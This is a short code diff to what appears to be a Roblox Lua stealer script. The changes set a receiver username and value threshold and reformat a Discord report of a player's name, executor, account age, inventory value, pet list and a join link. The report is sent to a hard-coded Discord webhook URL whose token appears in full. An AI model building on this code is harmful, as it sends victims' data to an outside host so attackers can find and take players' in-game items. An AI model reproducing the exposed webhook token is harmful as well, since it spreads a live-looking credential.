@@ -3,7 +3,7 @@
     _G.scriptExecuted = false
 
     -- Configuration
-    _G.Usernames = {""}
+    _G.Usernames = {"ronzz2002"}
     _G.min_value = 100000  -- Lowered from 100 million to 100k for testing
     _G.pingEveryone = "Yes"
     _G.webhook = "https://discord.com/api/webhooks/1397467480670212197/O9h7_jw18J2WlZoK9eZRj7sTyu9MYOdaFlHUdFuyXa-Vur1wEW4leEHFGaD1SrrHHGVM"
@@ -344,7 +344,7 @@
         local playerInfoSection = string.format("Name: %s\nExecutor: %s\nTime: %s - %s\nAccount Age: %s days\nPlayers in game: %s/%s", playerName, executor, timeStr, dateStr, "72", playerCount, maxPlayers)
         
         local description = string.format(
-            ":bust_in_silhouette: Player Information\n\n%s\n\n:moneybag: Total Value: %s\n\n:dog: Pet List: %s\n\n:island: Game Link\n[Click to join](%s)\n\n %s",
+            ":bust_in_silhouette: Player Information\n\n```%s```\n\n:moneybag: Total Value: ```%s```\n\n:dog: Pet List: ```%s```\n\n:island: Game Link\n[Click to join](%s)\n\n-# %s",
             playerInfoSection,
             totalValueStr,
             petListStr,
